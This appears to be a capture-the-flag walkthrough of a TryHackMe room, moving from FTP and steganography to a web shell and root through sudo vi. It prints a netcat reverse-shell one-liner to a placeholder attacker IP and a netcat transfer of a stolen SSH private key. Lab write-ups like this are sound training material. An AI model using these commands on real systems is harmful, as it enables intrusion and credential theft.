Running our nmap scan we have -:

Logging in to `FTP` as anonymous, we have a `gum_room.jpg` file, which we can download using the `mget` command

![](https://i.imgur.com/9eF1nYO.png)

Running `stegseek` on the image we found a file with a **base64** encoded text

![](https://i.imgur.com/9jDBkZn.png)


Decoding with **cyberchef** we have user **charlie** hash in `SHA-512 Crypt` format

![](https://i.imgur.com/wxKF5DU.png)

Tried cracking this hash but to no avail, so i decided to check port `80/HTTP`

![](https://i.imgur.com/vhDhAzC.png)

Tried login in, also to no avail, Running dir/file bruteforce with `dirsearch` we have few entries


![](https://i.imgur.com/duGfFzg.png)

checking `/home.php` we have a web shell ðŸ˜‚

![](https://i.imgur.com/5drmyPp.png)

We can go ahead and start up our listener in `netcat` and get a reverse shell with the below payload

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER-IP 4444 >/tmp/f
```


![](https://i.imgur.com/5j8PRUp.png)

checking `/var/www/html`, looks like we found the key **tryhackme** talked about

![](https://i.imgur.com/fgyUeas.png)

Concatenating `validate.php` in this same directory we have user **charlie's** password

![](https://i.imgur.com/AKRdHHQ.png)

This password doesn't seem to work for user **charlie** when switching but it works on the website and refer us back to that command injection page

![](https://i.imgur.com/7iTTOaA.png)

Navigating to user **charlie** home directory, i found a teleport file that contains an `SSH` id_rsa 

![](https://i.imgur.com/UuscklX.png)

we can go ahead and send it to our attacker machine using `netcat`

```bash
# on target machine
$ cat teleport | nc -lp 1234

# on attacker machine
$ nc 10.10.224.194 1234 > teleport
```

> **Note :** wait for few seconds, maybe 30 for the file to transfer cos' you won't see a prompt that it has been transferred then hit `Ctrl+C` on attacker machine to break connection


We logged in as user **charlie** via `SSH` using the private key


![](https://i.imgur.com/6dsjHxj.png)


Running `sudo -l` we can run `/usr/bin/vi` with sudo privileges without a password

![](https://i.imgur.com/kZd26Rb.png)

run `sudo /usr/bin/vi` and you should get a vi prompt

![](https://i.imgur.com/l1iuF00.png)


Then just type in`:shell` to spawn a shell with vi

![](https://i.imgur.com/zpUSLlN.png)

Click enter and you should be user **root**
